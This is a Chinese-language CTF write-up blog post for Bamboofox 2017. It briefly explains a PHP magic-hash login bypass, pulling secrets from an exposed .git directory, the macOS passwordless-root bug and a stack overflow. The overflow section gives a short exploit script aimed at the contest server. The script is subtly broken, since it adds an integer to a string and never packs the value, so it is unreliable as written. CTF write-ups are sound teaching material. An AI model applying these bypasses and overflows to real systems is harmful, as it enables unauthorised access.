---
title: Bamboofox CTF 2017
date: 2018-01-01 09:47:57
categories:
    - Write-up
    - Bamboofox
    - 2017
tags:
    - Write-up
    - Bamboofox
---


過了好幾個月重回了 CTF 比賽，但是這次考的是我以前沒學過的 x64 再加上我完全忘記要如何解題，變得 pwn 只拿下一題，挺失望的 QQ

`這裡就不分享 FLAG 了，只會寫出解法(也沒幾題QQ`

## Misc

### suck-browser
又是個 `302` 的坑，用 `curl` 就可以停止自動跳轉

### suck-apple
一個時事梗，只用 `root` 當作用戶名，不需要密碼即可有 `root` 權限

## Web

### suck-login

Description:
```
There is a suck login page and I found the md5 hash password is 0e836584205638841937695747769655.

Can you crack it?!
```

題目有提示 `hash(密碼)` 是 `0e` 開頭的，就可以聯想到是 php 會自動轉形態的問題，
因為 php 會自動把密碼的雜湊值轉成科學記號，變成0
所以密碼只要再找一組雜湊值一樣為0的就可以得到 FLAG

### tiny-git
看到題目，一開始就先看 `/.git/` 資料夾，發現會返回 `403 Forbidden`，
利用 `Denny` 大大的 Sctipt [(Link)](https://github.com/denny0223/scrabble)
可以發現檔案依舊可以下載，但是子目錄的檔案因為會返回 403
所以沒辦法瞭解內部檔案狀況
這時候就要科普一下 git 的儲存方式
[對於 git 的小解釋](https://www.siteground.com/tutorials/git/directory-structure/)
在找到 log 之後發現他直接在 commit messege 裡面寫上 FLAG

## pwn (最遺憾的一個類別)

### water-impossible
在題目有給了原始碼和 binary，在原始碼看到如果 `(int token) == 6666`
這個檢查有過，就會噴 FLAG
(保護只有開 NX)

所以利用 cyclic 確定可以蓋到 token ，並且知道 offset 是 28，所以
Payload:
{% codeblock lang:python %}
#!/usr/bin/env python

r = remote('bamboofox.cs.nctu.edu.tw', 58799)

payload = 'a'*28 + 0x00001a0a
r.recvuntil(':')
r.sendline(payload)
r.interactive()
{% endcodeblock %}

Rank: 21 (6l0ry)


